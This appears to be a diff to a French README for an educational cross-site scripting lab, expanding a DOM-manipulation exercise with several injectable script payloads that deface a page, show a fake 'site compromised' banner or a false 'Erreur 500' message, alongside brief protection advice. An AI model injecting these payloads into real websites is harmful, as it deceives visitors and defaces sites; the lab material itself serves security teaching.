@@ -58,23 +58,7 @@ Saisissez cette **payload XSS** et validez le formulaire :
 
 ---
 
-### 2️⃣ **XSS via DOM Manipulation**
-#### 📝 Description :
-Ce scénario montre comment le JavaScript d’une page peut être manipulé dynamiquement sans interaction serveur.
-
-#### 🎯 Objectif :
-- Exploiter une injection pour **modifier le DOM**.
-
-#### ✅ Solution :
-Dans la console du navigateur (F12 > Console), exécutez :
-```javascript
-document.body.innerHTML = "<h1 style='color:red;'>Site piraté !</h1>";
-```
-💡 **Impact** : L’utilisateur ne voit plus la page d’origine, un attaquant peut afficher un faux site.
-
----
-
-### 3️⃣ **XSS via Insertion de Lien Malveillant**
+### 2️⃣ **XSS via Insertion de Lien Malveillant**
 #### 📝 Description :
 L’objectif est de **piéger** un utilisateur en lui faisant cliquer sur un **lien injecté** dans un commentaire.
 
@@ -90,6 +74,57 @@ Saisissez cette **payload XSS** et validez le formulaire :
 
 ---
 
+### 3️⃣ **XSS via DOM Manipulation**
+#### 📝 Description :
+Ce scénario montre comment le JavaScript d’une page peut être manipulé dynamiquement sans interaction serveur.
+
+#### 🎯 Objectif :
+- Exploiter une injection pour **modifier le DOM**.
+
+#### ✅ Solution :
+1. Dans le champ, injecter l'un des scripts suivants :
+   
+   **Modifier le titre de la page** :
+   ```html
+   <script>document.title = "Site piraté !";</script>
+   ```
+
+   **Changer le texte principal** :
+   ```html
+   <script>document.querySelector('h1').innerText = "Ce site est compromis";</script>
+   ```
+
+   **Modifier l'apparence du site** :
+   ```html
+   <script>
+   document.body.style.backgroundColor = "black";
+   document.body.style.color = "red";
+   </script>
+   ```
+
+   **Afficher un message d'alerte en haut de la page** :
+   ```html
+   <script>
+   let warning = document.createElement("div");
+   warning.style = "position: fixed; top: 0; left: 0; width: 100%; background: red; color: white; padding: 10px; font-size: 20px; text-align: center;";
+   warning.innerText = "⚠️ Alerte : Site compromis !";
+   document.body.prepend(warning);
+   </script>
+   ```
+
+   **Faux message d'erreur** :
+   ```html
+   <script>
+   document.body.innerHTML = "<h1 style='color:red;text-align:center;'>Erreur 500 - Site en maintenance</h1>";
+   </script>
+   ```
+
+2. Valider le formulaire et observer le changement sur la page.
+
+📌 **Impact** : Un attaquant peut modifier le contenu affiché, afficher des messages trompeurs, et perturber la navigation.
+
+---
+
 ## 🛡 Comment Se Protéger ?
 ✅ **Éviter d’afficher directement les entrées utilisateur** (utiliser `htmlspecialchars()`).  
 ✅ **Implémenter un Content Security Policy (CSP)**.  
@@ -100,6 +135,6 @@ Saisissez cette **payload XSS** et validez le formulaire :
 
 ## 🐝 Disclaimer
 
-**Ce projet est destiné à l’éducation uniquement.** Toute utilisation non autorisée des concepts appris est **strictement interdite**.
+**Ce projet est destiné à l’éducation uniquement.** 
 
-Auteur : DANNENMULLER ZACHARIE
+**Auteur : DANNENMULLER ZACHARIE**
